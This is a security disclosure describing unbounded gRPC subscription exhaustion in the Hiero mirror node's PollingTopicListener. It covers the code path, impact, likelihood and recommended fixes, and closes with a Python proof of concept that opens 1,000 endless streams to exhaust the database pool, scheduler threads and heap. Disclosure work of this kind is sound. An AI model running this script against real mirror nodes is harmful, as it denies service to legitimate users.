### Title
Unbounded Persistent gRPC Subscription Exhaustion via PollingTopicListener (No Global Subscription Limit)

### Summary
`PollingTopicListener.listen()` creates a Flux pipeline with `RepeatSpec.times(Long.MAX_VALUE)` that polls the database indefinitely per subscription. There is no global limit on concurrent subscriptions and no per-IP rate limiting on the gRPC endpoint, allowing an unauthenticated attacker to open thousands of persistent streams across multiple TCP connections, exhausting scheduler threads, DB connection pool slots, and heap memory.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` at lines 38–43: [1](#0-0) 

Each call allocates a `PollingContext` and schedules a `Flux.defer(() -> poll(context))` that repeats `Long.MAX_VALUE` times with a 500 ms fixed delay on a `boundedElastic()` scheduler. Each repeat iteration calls `topicMessageRepository.findByFilter(newFilter)` via: [2](#0-1) 

**Root cause — failed assumption:** The design assumes subscriptions are short-lived or that infrastructure limits bound concurrency. Neither holds. The only server-side termination conditions are: (a) client cancels, (b) TCP drops, (c) a `limit` or `endTime` is set in the filter. An attacker omits both `limit` and `endTime`, keeps TCP connections alive, and never sends a cancel frame.

**Cancel handler analysis:** [3](#0-2) 

`disposable::dispose` is only invoked when the gRPC framework fires `onCancelHandler`, which requires the client to disconnect or send RST_STREAM. A cooperative attacker that holds the TCP connection open never triggers this.

**Per-connection limit is trivially bypassed:** [4](#0-3) [5](#0-4) 

`maxConcurrentCallsPerConnection = 5` limits calls *per TCP connection*, not globally. An attacker opens C connections × 5 streams = 5C simultaneous subscriptions. There is no per-IP connection limit, no global subscription cap, and no rate limiter on the gRPC module (the `ThrottleConfiguration` / `ThrottleManagerImpl` exist only in the `web3` module).

**Subscriber count is a metric, not a gate:** [6](#0-5) 

`subscriberCount` is exposed as a Micrometer gauge only; it is never checked against a maximum before accepting a new subscription.

**Protocol allows indefinite streams by design:** [7](#0-6) 

`limit = 0` and absent `consensusEndTime` are explicitly valid inputs that produce infinite streams.

### Impact Explanation

Each live subscription in POLL mode holds:
- One `PollingContext` + one `TopicContext` on the heap
- A recurring task slot in the shared `boundedElastic()` scheduler (default cap: `10 × CPU cores`)
- A DB connection from the R2DBC pool for the duration of each 500 ms poll

With enough connections an attacker saturates the `boundedElastic()` thread pool, exhausts the DB connection pool (causing all legitimate queries to queue or fail), and grows heap until GC pressure causes latency spikes or OOM. This degrades or kills the gRPC service on the targeted node(s) without affecting the attacker's own connections. Targeting multiple mirror-node replicas simultaneously can exceed the 30% threshold.

### Likelihood Explanation

- **No authentication required**: the `subscribeTopic` RPC is unauthenticated and publicly reachable on port 5600.
- **Low skill**: standard gRPC client libraries (grpc-java, grpcurl, Python grpc) can open hundreds of streams in a loop with a few lines of code.
- **Repeatable**: the attacker simply reconnects if ejected; there is no ban/block mechanism in the codebase.
- **Applicable when**: `hiero.mirror.grpc.listener.type = POLL` (non-default but documented and supported configuration).

### Recommendation

1. **Add a global concurrent-subscription cap** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable threshold (e.g., 1000).
2. **Add per-IP connection/subscription rate limiting** at the Netty layer or via a gRPC `ServerInterceptor` before the call reaches the service.
3. **Enforce a maximum subscription lifetime** (e.g., 24 h) server-side, independent of client behaviour, by adding a `timeout()` or `take(Duration)` operator to the Flux returned by `listen()`.
4. **Set a hard upper bound on `RepeatSpec`** rather than `Long.MAX_VALUE`; combine with a configurable `maxSubscriptionDuration` property.
5. **Add a `maxConnections` limit** to the Netty server builder in `GrpcConfiguration` to bound the total number of TCP connections.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2

TARGET = "mirror-node-host:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any valid topic

def open_streams(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    # Open 5 streams per connection (maxConcurrentCallsPerConnection default)
    streams = []
    for _ in range(5):
        query = consensus_service_pb2.ConsensusTopicQuery(
            topicID=basic_types_pb2.TopicID(
                shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM),
            # No limit, no endTime → infinite stream
        )
        it = stub.subscribeTopic(query)
        streams.append(it)
    # Hold connections open indefinitely
    import time; time.sleep(86400)

# Launch 200 threads → 200 connections × 5 streams = 1000 concurrent subscriptions
threads = [threading.Thread(target=open_streams, args=(i,)) for i in range(200)]
for t in threads: t.start()
for t in threads: t.join()
# Result: DB connection pool exhausted, boundedElastic() saturated,
#         heap pressure → gRPC node unresponsive to legitimate clients.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L34-49)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-62)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L50-52)
```java
        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L33-34)
```java
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```
